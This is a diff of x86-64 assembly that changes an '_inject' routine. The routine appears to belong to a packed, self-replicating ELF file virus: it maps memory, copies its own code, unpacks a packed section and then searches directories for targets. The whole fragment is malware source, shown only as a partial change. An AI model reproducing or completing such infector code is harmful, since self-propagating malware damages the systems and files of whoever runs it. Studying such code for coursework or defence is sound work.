@@ -102,21 +102,62 @@ _inject:
 		pop rax; mmap
 		syscall
 
-		pop r8
+;		push rax
+;		pop rdi
+;		push rsi
+;		pop rdx
+;		mov rsi, r8
+;		call _ft_memcpy
+;		push rdx
+;		pop rsi
+		push rsi ; save length
 
 		push rax
 		pop rdi
-		push rsi
-		pop rdx
-		mov rsi, r8
+		lea rsi, [rel _start]; addr
+		lea rdx, [rel _packed_part]
+		sub rdx, rsi
 		call _ft_memcpy
-		push rdx
-		pop rsi
+		add rsi, rdx
+		mov r9, rdi
 
+		add rdi, rdx
+		pop rsi
+		lea rcx, [rel _end_of_pack]
+		lea r8, [rel _eof]
+		sub r8, rcx
+		mov rax, rsi
+		push rax
+		sub rsi, r8
+		lea rdx, [rel _packed_part]
+		sub rdx, rcx
+
+		call _unpack
+
+		lea rax, [rel _packed_part]
+		add rsi, rax
+		lea rdi, [rel _start]
+		sub rsi, rdi
+		add rdi, rsi
+		lea rsi, [rel _end_of_pack]
+		lea rdx, [rel _eof]
+		sub rdx, rsi
+		call _ft_memcpy
+
+		mov r9, rdi
+
+		pop rsi
+		mov rdi, r9
+		
+;		push rsi
+;		pop rdx
+
+		pop rsi
+		pop r8
 		pop rdx
 
 		push rsi ; save length
-		push rdi ; save addr
+		push r9 ; save addr
 
 		lea rsi, [rel _start]
 		lea rax, [rel _search_dir]
@@ -132,6 +173,7 @@ _inject:
 		push 11
 		pop rax
 		syscall
+
 
 		jmp _end
 
